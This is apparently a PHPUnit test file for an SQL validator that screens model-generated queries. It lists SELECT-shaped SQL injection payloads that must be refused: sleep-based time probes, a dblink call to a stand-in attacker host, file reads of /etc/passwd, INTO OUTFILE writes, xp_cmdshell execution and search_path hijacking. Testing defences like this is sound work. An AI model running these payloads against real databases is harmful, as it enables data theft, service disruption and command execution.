<?php

namespace Jayanta\Jeeves\Tests\Unit;

use Jayanta\Jeeves\Security\SqlValidator;
use Jayanta\Jeeves\Tests\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;

/**
 * The attacks that survive a SELECT-only rule.
 *
 * `SqlValidator` refuses anything that is not a SELECT, refuses tables outside
 * the schema-derived whitelist, and refuses stacked statements. That is most
 * of the surface, and it is tested.
 *
 * What it does not obviously cover is the class of attack that is **valid
 * inside a single SELECT against an allowed table**. A time-based probe, an
 * out-of-band call, a file write - none of these need a second statement, none
 * of them names a forbidden table, and every one of them is a SELECT:
 *
 *     SELECT pg_sleep(10) FROM public.orders
 *     SELECT * FROM public.orders WHERE 1 = (SELECT BENCHMARK(5000000, MD5('x')))
 *     SELECT * FROM public.orders INTO OUTFILE '/tmp/leak.csv'
 *
 * The engine only ever runs SQL a model wrote from a prompt a user influenced,
 * so "the model would not write that" is not a control. Nothing in `tests/`
 * asserted any of these before this file existed.
 *
 * Each vector is named by what it does, and each says which engine it applies
 * to - a MySQL-only vector reaching a PostgreSQL adopter is a syntax error
 * rather than a breach, but the package supports both.
 */
class TheValidatorRefusesSelectOnlyAttacksTest extends TestCase
{
    private SqlValidator $validator;

    /** @var array<int, string> */
    private array $allowedTables = ['public.orders', 'public.customers'];

    protected function setUp(): void
    {
        parent::setUp();
        $this->validator = new SqlValidator;
    }

    /** @return array<string, array{0: string}> */
    public static function selectOnlyAttacks(): array
    {
        return [
            // ---- time-based: no data returned, the DELAY is the channel ----
            // pg_sleep lives in its own test below: it is NOT blocked today.
            'mysql time probe via BENCHMARK' => [
                "SELECT * FROM public.orders WHERE 1 = (SELECT BENCHMARK(5000000, MD5('x'))) LIMIT 1",
            ],
            'mysql time probe via SLEEP' => [
                'SELECT * FROM public.orders WHERE SLEEP(10) LIMIT 1',
            ],
            'sqlserver time probe via WAITFOR' => [
                "SELECT * FROM public.orders WHERE 1=1; WAITFOR DELAY '00:00:10'",
            ],

            // ---- out-of-band: the row never returns to the caller ----
            'postgres exfiltration via dblink' => [
                "SELECT * FROM dblink('host=attacker.example dbname=x', 'SELECT 1') AS t(c int)",
            ],
            'mysql file write via INTO OUTFILE' => [
                "SELECT * FROM public.orders INTO OUTFILE '/tmp/leak.csv'",
            ],
            'mysql file read via LOAD_FILE' => [
                "SELECT LOAD_FILE('/etc/passwd') FROM public.orders LIMIT 1",
            ],
            'sqlserver command execution via xp_cmdshell' => [
                "SELECT * FROM public.orders WHERE 1 = 1 EXEC xp_cmdshell 'whoami'",
            ],

            // ---- obfuscation: a comment is whitespace to the tokeniser ----
            // `\s*` in a pattern does not match `/**/`, so every rule shaped
            // "name followed by a paren" was one comment away from useless.
            'comment between the name and the paren' => [
                'SELECT pg_sleep/**/(10) FROM public.orders LIMIT 1',
            ],
            'comment between the name and the paren, mysql' => [
                'SELECT * FROM public.orders WHERE SLEEP/**/(10) LIMIT 1',
            ],

            // ---- locking: a read that blocks writers ----
            // FOR UPDATE was refused only by accident, because UPDATE is a
            // forbidden keyword. FOR SHARE was not refused at all.
            'locking read, FOR SHARE' => [
                'SELECT * FROM public.orders LIMIT 10 FOR SHARE',
            ],
            'locking read, FOR UPDATE' => [
                'SELECT * FROM public.orders LIMIT 10 FOR UPDATE',
            ],

            // ---- session state inside an ordinary SELECT ----
            // A bare SET never reaches here. set_config() is a function, and
            // it can change search_path - which decides which table an
            // unqualified name resolves to.
            'session state via set_config in a CTE' => [
                "WITH t AS (SELECT set_config('search_path','evil',false)) SELECT * FROM public.orders LIMIT 1",
            ],

            // ---- schema probing: an allowed table plus a system catalogue ----
            'postgres catalogue probe' => [
                'SELECT * FROM pg_catalog.pg_user LIMIT 10',
            ],
            'information_schema probe' => [
                'SELECT table_name FROM information_schema.tables LIMIT 10',
            ],
        ];
    }

    #[DataProvider('selectOnlyAttacks')]
    #[Test]
    public function a_statement_that_is_a_select_can_still_be_refused(string $sql)
    {
        $result = $this->validator->validate($sql, $this->allowedTables);

        $this->assertFalse(
            $result['valid'],
            "This is a single SELECT against an allowed table and it was ACCEPTED:\n  {$sql}\n"
                . 'Being a SELECT is not the same as being safe.'
        );
    }

    /**
     * BUG B2, fixed. PostgreSQL time probe.
     *
     * The validator blocked MySQL's SLEEP( and SQL Server's WAITFOR and
     * missed PostgreSQL's pg_sleep( -  on a package whose first-listed
     * database is PostgreSQL. Both of these are a single SELECT against an
     * allowed table, so nothing else in the chain refused them either, and the
     * effect is a request that holds a database connection for as long as the
     * argument says.
     *
     * The cause was a dead entry: `pg_` sat in the forbidden KEYWORD list,
     * where keywords are matched with \b on both sides -  and \b after an
     * underscore needs a non-word character next, which "pg_sleep" does not
     * have. It could never have fired.
     */
    #[Test]
    public function a_postgres_time_probe_is_refused()
    {
        foreach ([
            'SELECT pg_sleep(10) FROM public.orders LIMIT 1',
            "SELECT * FROM public.orders WHERE customer_name = 'x' OR (SELECT pg_sleep(10)) IS NULL LIMIT 1",
            "SELECT pg_read_file('/etc/passwd') FROM public.orders LIMIT 1",
            "SELECT lo_import('/etc/passwd') FROM public.orders LIMIT 1",
        ] as $sql) {
            $this->assertFalse(
                $this->validator->validate($sql, $this->allowedTables)['valid'],
                "A PostgreSQL system function was accepted:
  {$sql}"
            );
        }
    }

    /**
     * The allowlist: an unknown function is refused without being named.
     *
     * Everything above this is a denylist, and three rounds of sweeps found
     * three holes in it - the third breaking the second's fix. Deciding what
     * is PERMITTED inverts the failure mode: the cost of missing a function is
     * a refusal an adopter can see and fix in a line of config, not a breach
     * nobody notices.
     */
    #[Test]
    public function a_function_nobody_listed_is_refused()
    {
        foreach ([
            'SELECT dblink_connect(1) FROM public.orders LIMIT 1',
            'SELECT some_extension_fn(1) FROM public.orders LIMIT 1',
            "SELECT REPEAT('x', 1000000000) FROM public.orders LIMIT 1",
        ] as $sql) {
            $result = $this->validator->validate($sql, $this->allowedTables);
            $this->assertFalse($result['valid'], "accepted an unlisted function:\n  {$sql}");
        }
    }

    /** A refusal that does not say what to add is a dead end. */
    #[Test]
    public function the_refusal_names_the_function_and_the_setting()
    {
        $result = $this->validator->validate(
            'SELECT some_extension_fn(1) FROM public.orders LIMIT 1',
            $this->allowedTables
        );

        $this->assertStringContainsString('some_extension_fn', (string) $result['reason']);
        $this->assertStringContainsString('sql.allowed_functions', (string) $result['reason']);
    }

    /**
     * THE COUNTERWEIGHT THAT MATTERS MOST for the allowlist.
     *
     * Function calls are found with a regex, so a DATA VALUE containing a
     * parenthesis reads as a call: the customer "Acme (UK) Ltd" makes `Acme(`.
     * Company names shaped that way are ordinary, and refusing them would
     * break real questions on real schemas.
     *
     * Caught before shipping by running the allowlist against every gold
     * answer in both benchmark sets, where a Spider value tripped it. String
     * literals are blanked before extraction now.
     */
    #[Test]
    public function a_data_value_containing_a_parenthesis_is_not_a_function_call()
    {
        foreach ([
            "SELECT * FROM public.customers WHERE customer_name = 'Acme (UK) Ltd' LIMIT 10",
            "SELECT COUNT(*) FROM public.orders WHERE customer_name = 'Smith (Holdings)' LIMIT 1",
            "SELECT * FROM public.orders WHERE customer_name LIKE '%sportabout (v8)%' LIMIT 10",
        ] as $sql) {
            $result = $this->validator->validate($sql, $this->allowedTables);
            $this->assertTrue(
                $result['valid'],
                "a value with a parenthesis was read as a function call:\n  {$sql}\n  reason: "
                    . ($result['reason'] ?? 'none')
            );
        }
    }

    /** The aggregates every real question needs must all pass. */
    #[Test]
    public function the_functions_ordinary_questions_need_are_allowed()
    {
        foreach ([
            'SELECT COUNT(*) FROM public.orders LIMIT 1',
            'SELECT SUM(amount), AVG(amount), MIN(amount), MAX(amount) FROM public.orders LIMIT 1',
            'SELECT ROUND(AVG(amount), 2) FROM public.orders LIMIT 1',
            'SELECT DATE_TRUNC(\'month\', placed_on) FROM public.orders LIMIT 10',
            'SELECT COALESCE(LOWER(TRIM(customer_name)), \'x\') FROM public.customers LIMIT 10',
        ] as $sql) {
            $result = $this->validator->validate($sql, $this->allowedTables);
            $this->assertTrue(
                $result['valid'],
                "an ordinary aggregate was refused:\n  {$sql}\n  reason: " . ($result['reason'] ?? 'none')
            );
        }
    }

    /**
     * THE COUNTERWEIGHT. A refusal rule broad enough to catch the above must
     * not start refusing ordinary questions - a column called `sleep_hours`,
     * a customer named "Benchmark Ltd", a comment in generated SQL.
     */
    #[Test]
    public function ordinary_queries_that_merely_look_alarming_are_still_allowed()
    {
        $queries = [
            'SELECT customer_name FROM public.customers LIMIT 10',
            'SELECT SUM(amount) AS total FROM public.orders LIMIT 1',
            "SELECT * FROM public.customers WHERE customer_name = 'Benchmark Ltd' LIMIT 1",
            "SELECT * FROM public.orders WHERE customer_name LIKE '%outfile%' LIMIT 10",
            // Word boundaries earn their keep here: these columns contain the
            // locking keywords and are ordinary data.
            'SELECT share_price FROM public.orders LIMIT 10',
            'SELECT update_count FROM public.orders LIMIT 10',
        ];

        foreach ($queries as $sql) {
            $result = $this->validator->validate($sql, $this->allowedTables);
            $this->assertTrue(
                $result['valid'],
                "An ordinary question was refused:\n  {$sql}\n  reason: " . ($result['reason'] ?? 'none')
            );
        }
    }
}
